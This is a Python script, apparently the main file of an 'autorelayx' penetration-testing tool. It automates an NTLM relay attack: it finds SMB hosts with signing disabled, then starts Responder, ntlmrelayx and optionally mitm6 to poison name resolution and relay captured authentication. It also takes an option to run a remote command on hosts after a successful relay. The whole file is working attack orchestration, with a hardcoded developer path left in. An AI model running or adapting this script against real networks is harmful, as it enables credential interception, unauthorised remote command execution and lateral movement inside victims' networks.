#!/usr/bin/env python3

import asyncio
import argparse
import time
import sys
import signal
from src.utils import *
from src.tools import *
from src.smb import get_unsigned_hosts
from netaddr import IPNetwork, AddrFormatError

def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--hostlist", help="Host list file")
    parser.add_argument("-i", "--interface", help="Interface to use with Responder")
    parser.add_argument("-c", "--command", help="Remote command to run upon successful NTLM relay")
    parser.add_argument("-6", "--mitm6", action='store_true', help="Run mitm6 in conjunction with the relay attack")
    parser.add_argument("-d", "--domain", help="Domain for mitm6 to attack")
    parser.add_argument("-t", "--target", help="Target for ntlmrelayx to relay to")
    #parser.add_argument("-p", "--privexchange", help="Remote command to run upon successful NTLM relay")
    return parser.parse_args()

def parse_hostlist(hostlist):
    """
    Parse the hostlist argument

    Mandatory arguments:
    - hostlist : file with list of IPs or CIDR notation blocks
    """
    hosts = []
    with open(hostlist, 'r') as f:
        host_lines = f.readlines()
        for line in host_lines:
            line = line.strip()
            try:
                if '/' in line:
                    hosts += [str(ip) for ip in IPNetwork(line)]
                elif '*' in line:
                    print_bad('CIDR notation only in the host list, e.g. 10.0.0.0/24')
                else:
                    hosts.append(line)
            except (OSError, AddrFormatError):
                print_bad('Error importing host list file. Are you sure you chose the right file?')

    return hosts

async def main():

    if not args.target:
    #   hostlist = args.hostlist
        hostlist = '/home/dan/PycharmProjects/autorelayx/nocommit/home.txt'
        hosts = parse_hostlist(hostlist)
        unsigned_hosts = await get_unsigned_hosts(loop, hosts)

        if len(unsigned_hosts) == 0:
            print_bad('No hosts with SMB signing disabled found')
            sys.exit()

        print_good('Unsigned SMB hosts:')
        for h in unsigned_hosts:
            print_good('  '+h)

    # Start Responder
    responder = start_responder(args.interface)
    print_info(f"Running: {responder.cmd}")
    # Start ntlmrelayx
    ntlmrelayx = start_ntlmrelayx(args)
    print_info(f"Running: {ntlmrelayx.cmd}")

    # Start mitm6
    if args.mitm6:
        mitm6 = start_mitm6(args)
        print_info(f"Running: {mitm6.cmd}")

    ########## CTRL-C HANDLER ##############################
    def signal_handler(signal, frame):
        """
        Catch CTRL-C and kill procs
        """
        print_info('CTRL-C caught, cleaning up and closing')

        # Kill procs
        print_info('Killing Responder')
        responder.kill()
        print_info('Killing ntlmrelayx')
        ntlmrelayx.kill()
        if args.mitm6:
            print_info('Killing mitm6, may take a minute')
            mitm6.kill()
        time.sleep(5)
        try:
            os.remove(f'{cwd}/arp.cache')
        except FileNotFoundError:
            pass
        print_good('Done')
        sys.exit()

    signal.signal(signal.SIGINT, signal_handler)
    ########## CTRL-C HANDLER ##############################

    ntlmrelay_file = open(f'{cwd}/logs/ntlmrelayx.log', 'r')
    file_lines = follow_file(ntlmrelay_file)
    for line in file_lines:
        print('    '+line.strip())


if __name__ == "__main__":

        if os.geteuid():
            print_bad('Run as root')
            sys.exit()

        args = parse_args()
        loop = asyncio.get_event_loop()
        try:
            loop.run_until_complete(main())
        except KeyboardInterrupt:
            print("Received exit, exiting")
        loop.close()